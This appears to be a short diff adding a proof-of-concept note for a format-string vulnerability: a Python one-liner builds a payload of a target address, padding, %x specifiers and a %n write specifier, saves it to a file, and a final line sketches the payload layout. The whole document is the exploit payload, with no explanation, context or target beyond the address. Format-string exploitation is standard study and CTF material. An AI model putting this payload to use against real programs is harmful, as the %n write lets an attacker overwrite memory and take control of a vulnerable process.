@@ -1,0 +1,3 @@
+POC: 
+python -c 'print "\xe4\x96\x04\x08%42x"+"%x."*2+"%n"' > foo
+|Address|Value|Padding|%n
